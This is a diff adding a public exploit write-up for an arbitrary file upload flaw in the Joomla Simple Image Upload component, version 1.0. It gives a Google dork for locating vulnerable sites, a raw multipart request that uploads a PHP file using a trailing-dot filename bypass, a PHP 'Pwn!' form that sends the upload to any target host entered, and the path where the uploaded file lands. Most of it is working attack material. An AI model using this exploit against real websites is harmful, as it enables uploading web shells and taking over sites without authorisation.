@@ -1,0 +1,70 @@
+# Exploit Title: Joomla Simple Image Upload - Arbitrary File Upload
+# Google Dork: inurl:option=com_simpleimageupload
+# Date: 23.06.2015
+# Exploit Author: CrashBandicot @DosPerl
+# Vendor Homepage: http://tuts4you.de/
+# Software Link: http://tuts4you.de/96-development/156-simpleimageupload
+# Version: 1.0
+# Tested on: MsWin32
+
+# Vuln Same to Com_Media Vulnerability
+
+# Live Request :
+
+POST /index.php?option=com_simpleimageupload&view=upload&tmpl=component&e_name=desc HTTP/1.1
+
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?option=com_simpleimageupload&view=upload&tmpl=component&e_name=desc
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------247062787817068
+
+
+-----------------------------247062787817068\r\n
+Content-Disposition: form-data; name="Filedata"; filename="L0v3.php."\r\n
+Content-Type: application/x-php\r\n
+\r\n
+0wn3d ! ;)\r\n
+-----------------------------247062787817068\r\n
+Content-Disposition: form-data; name="return-url"\r\n
+\r\n
+aW5kZXgucGhwP29wdGlvbj1jb21fc2ltcGxlaW1hZ2V1cGxvYWQmdmlldz11cGxvYWQmdG1wbD1jb21wb25lbnQmZV9uYW1lPWRlc2M=\r\n
+-----------------------------247062787817068--\r\n
+
+
+# Exploit :
+
+<?php 
+
+echo '<form action="#"  method="post" enctype="multipart/form-data">
+<input type="text" name="target" value="www.localhost.com" /><input type="submit" name="Pwn" value="Pwn!" />
+</form>';
+
+
+if($_POST) { 
+	
+	$target = $_POST['target'];
+
+$file = "0wn3d ! ;)"; 
+$header = array("Content-Type: application/x-php",
+"Content-Disposition: form-data; name=\"Filedata\"; file=\"L0v3.php.\"");
+
+$ch = curl_init("http://".$target."/index.php?option=com_simpleimageupload&task=upload.upload&tmpl=component");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36");
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$file", "return-url" => "aW5kZXgucGhwP29wdGlvbj1jb21fc2ltcGxlaW1hZ2V1cGxvYWQmdmlldz11cGxvYWQmdG1wbD1jb21wb25lbnQmZV9uYW1lPWRlc2M=",)); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+$result = curl_exec($ch);
+curl_close($ch);
+print "$result";
+
+} else { die(); }
+?>
+
+
+# Path of File : 127.0.0.1/images/[Rand0mString]L0v3.php
+# Sh00t to Mr_AnarShi-T;
